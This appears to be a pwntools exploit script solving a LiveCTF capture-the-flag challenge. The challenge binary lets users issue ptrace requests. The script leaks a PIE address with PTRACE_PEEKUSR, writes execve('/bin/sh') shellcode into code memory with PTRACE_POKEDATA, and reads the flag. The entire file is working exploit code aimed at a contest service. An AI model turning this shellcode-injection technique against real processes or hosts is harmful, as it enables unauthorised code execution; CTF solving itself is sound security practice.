#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ../handout/challenge --host localhost --port 31337
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('challenge')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or os.environ.get('HOST', 'localhost')
port = int(args.PORT or 31337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

def send_int(msg: bytes, val: int):
    io.sendlineafter(msg, f"{val:x}".encode())

def send_ptrace_req(req: int, addr: int, data: int, cont=True):
    send_int(b"What ptrace request do you want to send?", req)
    send_int(b"What address do you want?", addr)
    send_int(b"What do you want copied into data?", data)
    io.recvuntil(b"ptrace returned ")
    ret = io.recvline()
    val = int(ret.decode().strip(), 0)
    if cont:
        do_cont()
    return val

def do_cont(do_cont = True):
    send_int(b"Do another (0/1)?", 1 if do_cont else 0)

PTRACE_TRACEME =           0
PTRACE_PEEKTEXT =           1
PTRACE_PEEKDATA =           2
PTRACE_PEEKUSR =           3
PTRACE_POKETEXT =           4
PTRACE_POKEDATA =           5
PTRACE_POKEUSR =           6
PTRACE_CONT =           7
PTRACE_KILL =           8
PTRACE_SINGLESTEP =       9

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# shellcode = asm(shellcraft.sh())
# shellcode = shellcode + b"\x00"*(8-len(shellcode)%8)
# while shellcode:
#     io.sendlineafter(b"to send?", b"5")
#     io.sendlineafter(b"do you want?", str(0x1300+80+8*_).encode())
#     io.sendlineafter(b"data?", f"{u64(shellcode[:8]):x}".encode())
#     shellcode = shellcode[8:]
#     io.sendlineafter(b"(0/1)", b"1" if shellcode else b"0")

def peekusr(addr):
    return send_ptrace_req(PTRACE_PEEKUSR, addr, 0)

some_pie_addr = peekusr(8)
log.info("some_pie = 0x%x", some_pie_addr)
pie_base = some_pie_addr - (0x555555557d68-0x555555554000)
log.success("pie_base = 0x%x", pie_base)

# for i in range(0, 0x100, 8):
#     val = send_ptrace_req(PTRACE_PEEKUSR, i, 0)
#     log.info("0x%x: 0x%016x", i, val)

ptrace_ret = pie_base + 0x13A7

shellcode = asm(shellcraft.execve("/bin/sh", ["/bin/sh", "-c", "./submitter"], 0))

shellcode = shellcode + b"\x00"*(8-len(shellcode)%8)

addr = ptrace_ret
while len(shellcode) > 0:
    curr_data = shellcode[:8]
    val = u64(curr_data)
    send_ptrace_req(PTRACE_POKEDATA, addr, val)
    addr += 8
    shellcode = shellcode[8:]

send_ptrace_req(PTRACE_CONT, 0, 0, False)

# io.interactive()

time.sleep(1.0)

# io.sendline(b"ls")
do_cont(False)

# io.recvline_contains(b"You sent:")
# io.sendline(b"./submitter")
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
# log.info('Flag: %s', flag)
log.info('%s', flag)

